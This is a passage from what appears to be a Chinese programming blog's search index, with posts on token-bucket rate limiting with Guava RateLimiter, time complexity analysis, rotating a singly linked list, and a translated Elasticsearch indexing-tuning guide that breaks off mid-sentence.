title="2.令牌桶算法"></a>2.令牌桶算法</h3><p>令牌桶算法的原理是系统以一定速率向桶中放入令牌，如果有请求时，请求会从桶中取出令牌，如果能取到令牌，则可以继续完成请求，否则等待或者拒绝服务。这种算法可以应对突发程度的请求，因此比漏桶算法好。</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/java/081226107372877.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/java/081226107372877.png" alt="img"></a></p><p>在 Wikipedia 上，令牌桶算法是这么描述的：</p><ul><li>每秒会有 r 个令牌放入桶中，或者说，每过 1/r 秒桶中增加一个令牌</li><li>桶中最多存放 b 个令牌，如果桶满了，新放入的令牌会被丢弃</li><li>当一个 n 字节的数据包到达时，消耗 n 个令牌，然后发送该数据包</li><li>如果桶中可用令牌小于 n，则该数据包将被缓存或丢弃</li></ul><h2 id="二、RateLimiter"><a href="#二、RateLimiter" class="headerlink" title="二、RateLimiter"></a>二、RateLimiter</h2><p>Guava中开源出来一个令牌桶算法的工具类RateLimiter，可以轻松实现限流的工作。RateLimiter 对简单的令牌桶算法做了一些工程上的优化，具体的实现是 SmoothBursty。需要注意的是，RateLimiter 的另一个实现 SmoothWarmingUp，就不是令牌桶了，而是漏桶算法。也许是出于简单起见，RateLimiter 中的时间窗口能且仅能为 1s，如果想搞其他时间单位的限流，只能另外造轮子。</p><p>RateLimiter 有一个有趣的特性是「前人挖坑后人跳」，也就是说 RateLimiter 允许某次请求拿走超出剩余令牌数的令牌，但是下一次请求将为此付出代价，一直等到令牌亏空补上，并且桶中有足够本次请求使用的令牌为止。这里面就涉及到一个权衡，是让前一次请求干等到令牌够用才走掉呢，还是让它先走掉后面的请求等一等呢？Guava 的设计者选择的是后者，先把眼前的活干了，后面的事后面再说。</p><p>测试代码：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RateLimiterMain</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        RateLimiter rateLimiter <span class="token operator">=</span> RateLimiter<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>rateLimiter<span class="token punctuation">.</span><span class="token function">acquire</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>rateLimiter<span class="token punctuation">.</span><span class="token function">acquire</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>rateLimiter<span class="token punctuation">.</span><span class="token function">acquire</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>输出内容：</p><pre><code>0.02.4968890.992149</code></pre><p>可以看出，令牌桶每秒只能产生2个令牌，我们可以第一次取出5个，但是第二个再去取令牌的时候，需要等2.5s，也就是第一次令牌取完后，需要等2.5s才能取到令牌。同样的，第三次取1个令牌的时候，也需要等待第二次的1s的时间。也就是，取的速率可以超过令牌产生的速率，但是下一次再次去取的时候，需要阻塞等待。</p><p>当然也可以使用tryAcquire来非阻塞的获取，可以实时返回结果。另外tryAcquire也可以传入参数，也就是等待的时间，超时直接返回false。这点等同于常见的lock，tryLock。</p><h2 id="三、并发控制Semaphore"><a href="#三、并发控制Semaphore" class="headerlink" title="三、并发控制Semaphore"></a>三、并发控制Semaphore</h2><p>一般来说，在网关系统中，还有一个参数叫并发控制，就是某一个资源可以被同时访问的个数。这种情况下，我们可以使用Semaphore来控制。</p><p>Semaphore不同于互斥锁。互斥锁是某个资源只能支持同时一个访问，而Semaphore可以支持多个访问，但是加上了总数的控制。</p><p>感兴趣的同学可以继续深入了解Semaphore的使用。</p><p>本文转载自:  <a href="https://www.cnblogs.com/f-zhao/p/7210158.html" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Guava </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法时间复杂度求解法【详细过程说明】</title>
      <link href="/2019/01/06/suan-fa/suan-fa-shi-jian-fu-za-du-qiu-jie-fa-xiang-xi-guo-cheng-shuo-ming/"/>
      <url>/2019/01/06/suan-fa/suan-fa-shi-jian-fu-za-du-qiu-jie-fa-xiang-xi-guo-cheng-shuo-ming/</url>
      
        <content type="html"><![CDATA[<h1 id="算法时间复杂度求解法"><a href="#算法时间复杂度求解法" class="headerlink" title="算法时间复杂度求解法"></a>算法时间复杂度求解法</h1><blockquote><p>在进行算法分析时，语句总的执行次数T(n)是关于问题规模n的函数，进而分析T(n)随n的变化情况并确定T(n)的数量级。算法的时间复杂度，也就是算法的时间量度，基座T（n）=O(f(n))。它表示随问题规模n的增大，算法执行时间的增长率和f(n)的增长率相同，称作算法的渐进算法时间复杂度，简称为时间复杂度。其中f(n)是问题规模n的某个函数。</p></blockquote><p>一般用大写O()来表示算法的时间复杂度写法，通常叫做大O记法。</p><p>一般情况下，随着n的增大，T(n)增长最慢的算法为最优算法。</p><p>O(1)：常数阶</p><p>O(n)：线性阶</p><p>O(n^2)：平方阶</p><h2 id="大O推导法"><a href="#大O推导法" class="headerlink" title="大O推导法"></a><strong>大O推导法</strong></h2><ol><li>用常数1取代运行时间中的所有加法常数</li><li>在修改后的运行函数中，只保留最高阶项</li><li>如果最高阶项存在且不是1，则去除与这个项相乘的常数</li></ol><h2 id="常数阶"><a href="#常数阶" class="headerlink" title="常数阶"></a><strong>常数阶</strong></h2><pre class=" language-java"><code class="language-java"><span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> n <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*执行一次*/</span>sum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">*</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">/*执行一次*/</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/*执行一次*/</span></code></pre><p>这个算法的运行次数f(n) = 3,根据推导大O阶的方法，第一步是将3改为1，在保留最高阶项是，它没有最高阶项，因此这个算法的时间复杂度为O(1);</p><p>另外，</p><pre class=" language-java"><code class="language-java"><span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> n <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*执行一次*/</span>sum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">*</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">/*执行第1次*/</span>sum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">*</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">/*执行第2次*/</span>sum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">*</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">/*执行第3次*/</span>sum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">*</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">/*执行第4次*/</span>sum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">*</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">/*执行第5次*/</span>sum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">*</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">/*执行第6次*/</span>sum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">*</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">/*执行第7次*/</span>sum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">*</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">/*执行第8次*/</span>sum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">*</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">/*执行第9次*/</span>sum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">*</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">/*执行第10次*/</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/*执行一次*/</span></code></pre><p>上面的两段代码中，其实无论n有多少个，本质是是3次和12次的执行差异。这种与问题的大小无关，执行时间恒定的算法，成为具有O(1)的时间复杂度，又叫做常数阶。</p><p>注意：不管这个常数是多少，3或12，都不能写成O(3)、O(12)，而都要写成O(1)</p><p>此外，对于分支结构而言，无论真假执行的次数都是恒定不变的，不会随着n的变大而发生变化，所以单纯的分支结构（不在循环结构中），其时间复杂度也是O(1)。</p><h2 id="线性阶"><a href="#线性阶" class="headerlink" title="线性阶"></a><strong>线性阶</strong></h2><p>线性阶的循环结构会复杂一些，要确定某个算法的阶次，需要确定特定语句或某个语句集运行的次数。因此要分析算法的复杂度，关键是要分析循环结构的运行情况。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/*时间复杂度为O(1)的程序*/</span>      <span class="token punctuation">}</span></code></pre><h2 id="对数阶"><a href="#对数阶" class="headerlink" title="对数阶"></a><strong>对数阶</strong></h2><pre class=" language-java"><code class="language-java"><span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>count <span class="token operator">&lt;</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span>  count <span class="token operator">=</span> count <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/*时间复杂度为O(1)的程序*/</span>    <span class="token punctuation">}</span> </code></pre><p>因为每次count*2后，距离结束循环更近了。也就是说有多少个2 相乘后大于n，退出循环。</p><p>数学公式：2x = n    –&gt;     x = log2n</p><p>因此这个循环的时间复杂度为O(logn)</p><h2 id="平方阶"><a href="#平方阶" class="headerlink" title="平方阶"></a><strong>平方阶</strong></h2><pre class=" language-java"><code class="language-java"><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n <span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/*时间复杂度为O(1)的程序*/</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>上面的程序中，对于对于内层循环，它的时间复杂度为O(n)，但是它是包含在外层循环中，再循环n次，因此这段代码的时间复杂度为O(n^2)。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> j <span class="token operator">&lt;</span> m <span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/*时间复杂度为O(1)的程序*/</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>但是，如果内层循环改成了m次，时间复杂度就为O(n*m)</p><p>再来看一段程序：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> i <span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n <span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/*时间复杂度为O(1)的程序*/</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>注意：上面的内层循环j = i ;而不是0</p><p>因为i = 0时，内层循环执行了n次，当i=1时，执行了n-1次……当i=n-1时，执行了1次，所以总的执行次数为：</p><p>n+(n-1)+(n-1)+…+1 = n(n+1)/2  =  n2/2 + n/2</p><p>根据大O推导方法，保留最高阶项，n2/2 ，然后去掉这个项相乘的常数，1/2</p><p>因此，这段代码的时间复杂度为O(n^2)</p><p>下面，分析调用函数时的时间复杂度计算方法：</p><p>首先，看一段代码：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">function</span><span class="token punctuation">(</span><span class="token keyword">int</span> count<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">print</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">function</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>  <span class="token punctuation">}</span></code></pre><p>函数的时间复杂度是O(1)，因此整体的时间复杂度为O(n)。</p><p>假如function是这样的：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">function</span><span class="token punctuation">(</span><span class="token keyword">int</span> count<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> count <span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n <span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">/*时间复杂度为O(1)的程序*/</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>和第一个的不同之处在于把嵌套内循环放到了函数中，因此最终的时间复杂度为O(n^2)</p><p>再来看一个比价复杂的语句:</p><pre class=" language-java"><code class="language-java">n<span class="token operator">++</span><span class="token punctuation">;</span>                                      <span class="token comment" spellcheck="true">/*执行次数为1*/</span><span class="token function">function</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">/*执行次数为n*/</span><span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                 <span class="token comment" spellcheck="true">/*执行次数为nXn*/</span>  <span class="token function">function</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">/*执行次数为n(n+1)/2*/</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> i <span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n <span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/*时间复杂度为O(1)的程序*/</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>    </code></pre><p>它的执行次数f(n) = 1 + n + n2 + n(n+1)/2 + 3/2n2+3/2 n+1,</p><p>根据推导大O阶的方法，最终它的时间复杂度为：O(n^2)</p><h2 id="nlog2n阶"><a href="#nlog2n阶" class="headerlink" title="nlog2n阶"></a><strong>nlog2n阶</strong></h2><pre class=" language-java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">function</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>let size <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> size <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> size <span class="token operator">+=</span> size<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>let i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i <span class="token operator">+=</span> size<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">orderMerge</span><span class="token punctuation">(</span><span class="token function">arr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    function <span class="token function">orderMerge</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>它的执行次数f(n) = n * log2n，因此整体的时间复杂度为O(nlog2n)。</p><p><strong>常见的时间复杂度：</strong></p><table><thead><tr><th><strong>执行次数函数</strong></th><th><strong>阶</strong></th><th><strong>术语描述</strong></th></tr></thead><tbody><tr><td>12</td><td>O(1)</td><td>常数阶</td></tr><tr><td>2n+3</td><td>O(n)</td><td>线性阶</td></tr><tr><td>3n2+2n+1</td><td>O(n2)</td><td>平方阶</td></tr><tr><td>5log2n+20</td><td>O(log2n)</td><td>对数阶</td></tr><tr><td>2n+3nlog2n+19</td><td>O(nlogn)</td><td>nlog2n阶</td></tr><tr><td>6n3+2n2+3n+4</td><td>O(n3)</td><td>立方阶</td></tr><tr><td>2^n</td><td>O(2^n)</td><td>指数阶</td></tr></tbody></table><p><a href="https://images2015.cnblogs.com/blog/867077/201604/867077-20160425141431502-2111846381.png" target="_blank" rel="noopener"><img src="https://images2015.cnblogs.com/blog/867077/201604/867077-20160425141431502-2111846381.png" alt="img"></a></p><p>时间复杂度所耗费的时间是：</p><p>O(1) &lt; O(logn) &lt; O(n) &lt; O(nlogn) &lt; O(n2) &lt; O(n3) &lt;O(2n) &lt; O(n!) &lt;O(n^n)</p><p>参考自：<a href="https://www.cnblogs.com/fanchangfa/p/3868696.html" target="_blank" rel="noopener">三月——Frank</a></p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>旋转单链表</title>
      <link href="/2019/01/06/suan-fa/lian-biao/xuan-zhuan-dan-lian-biao/"/>
      <url>/2019/01/06/suan-fa/lian-biao/xuan-zhuan-dan-lian-biao/</url>
      
        <content type="html"><![CDATA[<h2 id="旋转单链表"><a href="#旋转单链表" class="headerlink" title="旋转单链表"></a>旋转单链表</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个单链表和一个数字 k，你要把链表右边的节点旋转到链表左边，共旋转 k 次。</p><pre><code>比如说，给你的单链表是：0 -&gt; 1 -&gt; 2 -&gt; 4 -&gt; 8给你的数字 k 是 3：k = 3把链表右边的节点一个个旋转到左边，操作 3 次。先是节点 8，然后是节点 4，最后是节点 2。剩下的节点 0 和 1 保持不动。最后得到旋转后的链表是：2 -&gt; 4 -&gt; 8 -&gt; 0 -&gt; 1</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    ListNode next<span class="token punctuation">;</span>    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> ListNode <span class="token function">rotateRightToLeft</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> null <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> null <span class="token operator">||</span> k <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> head<span class="token punctuation">;</span>    ListNode end <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> end<span class="token punctuation">.</span>next <span class="token operator">!=</span> null<span class="token punctuation">;</span> end <span class="token operator">=</span> end<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token operator">++</span>n<span class="token punctuation">;</span>    end<span class="token punctuation">.</span>next <span class="token operator">=</span> head<span class="token punctuation">;</span>    k <span class="token operator">%=</span> n<span class="token punctuation">;</span>    ListNode newEnd <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token operator">-</span>k<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> newEnd <span class="token operator">=</span> newEnd<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    ListNode newHead <span class="token operator">=</span> newEnd<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    newEnd<span class="token punctuation">.</span>next <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">return</span> newHead<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ES官方调优指南翻译</title>
      <link href="/2019/01/06/elasticsearch/es-guan-fang-diao-you-zhi-nan-fan-yi/"/>
      <url>/2019/01/06/elasticsearch/es-guan-fang-diao-you-zhi-nan-fan-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="ES官方调优指南翻译"><a href="#ES官方调优指南翻译" class="headerlink" title="ES官方调优指南翻译"></a>ES官方调优指南翻译</h1><p>ES发布时带有的默认值，可为es的开箱即用带来很好的体验。全文搜索、高亮、聚合、索引文档 等功能无需用户修改即可使用,当你更清楚的知道你想如何使用es后，你可以作很多的优化以提高你的用例的性能,下面的内容告诉你 你应该/不应该 修改哪些配置</p><h2 id="第一部分：调优索引速度"><a href="#第一部分：调优索引速度" class="headerlink" title="第一部分：调优索引速度"></a>第一部分：调优索引速度</h2><p>（<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/tune-for-indexing-speed.html%EF%BC%89" target="_blank" rel="noopener">调优索引速度</a>)</p><ol><li>使用批量请求批量请求将产生比单文档索引请求好得多的性能。</li></ol><p>为了知道批量请求的最佳大小，您应该在具有单个分片的单个节点上运行基准测试。 首先尝试索引100个文件，然后是200，然后是400，等等。 当索引速度开始稳定时，您知道您达到了数据批量请求的最佳大小。 在配合的情况下，最好在太少而不是太多文件的方向上犯错。 请注意，如果群集请求太大，可能会使群集受到内存压力，因此建议避免超出每个请求几十兆字节，即使较大的请求看起来效果更好。</p><ol><li>发送端使用多worker/多线程向es发送数据<br>发送批量请求的单个线程不太可能将Elasticsearch群集的索引容量最大化。 为了使用集群的所有资源，您应该从多个线程或进程发送数据。 除了更好地利用集群的资源，这应该有助于降低每个fsync的成本。</li></ol><p>请确保注意TOO_MANY_REQUESTS（429）响应代码（Java客户端的EsRejectedExecutionException），这是Elasticsearch告诉您无法跟上当前索引速率的方式。 发生这种情况时，应该再次尝试暂停索引，理想情况下使用随机指数回退。</p><p>与批量调整大小请求类似，只有测试才能确定最佳的worker数量。 这可以通过逐渐增加工作者数量来测试，直到集群上的I / O或CPU饱和。</p><ol><li>调大 refresh interval<br>默认的index.refresh_interval是1s，这迫使Elasticsearch每秒创建一个新的分段。 增加这个价值（比如说30s）将允许更大的部分flush并减少未来的合并压力。</li><li>加载大量数据时禁用refresh和replicas<br>如果您需要一次加载大量数据，则应该将index.refresh_interval设置为-1并将index.number_of_replicas设置为0来禁用刷新。这会暂时使您的索引处于危险之中，因为任何分片的丢失都将导致数据 丢失，但是同时索引将会更快，因为文档只被索引一次。 初始加载完成后，您可以将index.refresh_interval和index.number_of_replicas设置回其原始值。</li><li>设置参数，禁止OS将es进程swap出去<br>您应该确保操作系统不会swapping out the java进程，通过禁止swap<br>（<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/setup-configuration-memory.html%EF%BC%89" target="_blank" rel="noopener">内存配置</a>)</li><li>为filesystem cache分配一半的物理内存<br>文件系统缓存将用于缓冲I / O操作。 您应该确保将运行Elasticsearch的计算机的内存至少减少到文件系统缓存的一半。</li><li>使用自动生成的id（auto-generated ids）<br>索引具有显式id的文档时，Elasticsearch需要检查具有相同id的文档是否已经存在于相同的分片中，这是昂贵的操作，并且随着索引增长而变得更加昂贵。 通过使用自动生成的ID，Elasticsearch可以跳过这个检查，这使索引更快。</li><li>买更好的硬件<br>搜索一般是I/O 密集的，此时，你需要<br>a.为filesystem cache分配更多的内存<br>b.使用SSD硬盘<br>c.使用local storage（不要使用NFS、SMB 等remote filesystem）<br>d.亚马逊的 弹性块存储（Elastic Block Storage）也是极好的，当然，和local storage比起来，它还是要慢点<br>如果你的搜索是 CPU-密集的，买好的CPU吧</li><li>加大 indexing buffer size<br>如果你的节点只做大量的索引，确保index.memory.index_buffer_size足够大，每个分区最多可以提供512 MB的索引缓冲区，而且索引的性能通常不会提高。 Elasticsearch采用该设置（java堆的一个百分比或绝对字节大小），并将其用作所有活动分片的共享缓冲区。 非常活跃的碎片自然会使用这个缓冲区，而不是执行轻量级索引的碎片。</li></ol><p>默认值是10％，通常很多：例如，如果你给JVM 